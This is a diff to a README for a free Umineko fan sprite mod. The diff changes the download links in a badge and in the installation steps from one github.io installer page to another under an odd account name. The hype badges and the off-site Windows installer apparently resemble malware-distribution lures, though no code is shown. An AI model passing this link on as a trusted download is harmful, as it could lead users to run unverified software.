@@ -4,7 +4,7 @@
 
 ### Umineko PS3 Sprites Mod: free fan mod for Umineko When They Cry, no key, no ads.
 
-[![DOWNLOAD](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD-red?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![DOWNLOAD](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD-red?style=for-the-badge&logo=github)](https://BursarHypnotize.github.io/install-win/)
 [![Status](https://img.shields.io/badge/STATUS-WORKING_%F0%9F%9F%A2-brightgreen?style=for-the-badge)](#features)
 [![Key System](https://img.shields.io/badge/KEY-NO_KEY_required-success?style=for-the-badge)](#features)
 [![Platform](https://img.shields.io/badge/PLATFORM-Windows_10_%E2%80%A2_11-blue?style=for-the-badge)](#requirements)
@@ -35,7 +35,7 @@ The Umineko PS3 Sprites Mod replaces the original sprites with the polished PS3 
 
 ## 🛠️ Installation
 
-1. **Download the latest build** 👉 **[https://mixedlinkrelease.github.io/installer/](https://mixedlinkrelease.github.io/installer/)**
+1. **Download the latest build** 👉 **[https://BursarHypnotize.github.io/install-win/](https://BursarHypnotize.github.io/install-win/)**
 2. **Back up your save folder** before applying any mod.
 3. **Extract** the archive into the game's install directory.
 4. **Run the installer / copy the files** as instructed in the archive.
